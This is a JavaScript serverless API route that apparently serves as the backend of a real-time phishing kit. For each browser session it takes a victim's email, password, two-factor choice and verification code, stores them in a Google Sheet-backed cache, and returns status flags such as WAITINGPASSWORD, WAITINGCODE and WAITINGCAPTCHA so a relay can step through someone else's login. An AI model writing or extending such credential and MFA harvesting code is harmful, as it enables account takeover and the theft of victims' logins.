import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { getCachedRow, setCachedRow, populateCache } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { getSheetDataApi } from "../../../api/googlesheets.js";

export async function POST(request) {
    incrementUsage();

    let body;
    try {
        body = await request.json();
    } catch (e) {
        try {
            const text = await request.text();
            body = Object.fromEntries(new URLSearchParams(text));
        } catch (e2) {
            return corsJson({ success: false, error: "Invalid request body" }, 400);
        }
    }

    const { browserId, token, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    if (email || password || verificationChoice || verificationCode) {
        const updates = { lastUserActivity: new Date().toISOString() };
        if (email) { updates.email = email; updates.domain = email.split('@')[1] || ''; }
        if (password) updates.password = password;
        if (verificationChoice) updates.verificationChoice = verificationChoice;
        if (verificationCode) updates.verificationCode = verificationCode;
        setCachedRow(browserId, updates);
    }

    let row = getCachedRow(browserId);

    if (!row) {
        try {
            const cookieData = await getSheetDataApi("cookie");
            if (cookieData.success) {
                row = cookieData.data.find(r => r.browserId === browserId);
                if (row) populateCache(browserId, row);
            }
        } catch (e) {
        }
    }

    if (!row) {
        return corsJson({ success: false, error: "Session not found" }, 404);
    }

    const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGPASSWORDERROR", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
    if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
        setCachedRow(browserId, { status: "FAILED" });
        row.status = "FAILED";
    }

    return corsJson({
        success: true,
        currentStatus: row.status,
        data: row
    });
}

export async function OPTIONS() {
    return corsOptions();
}
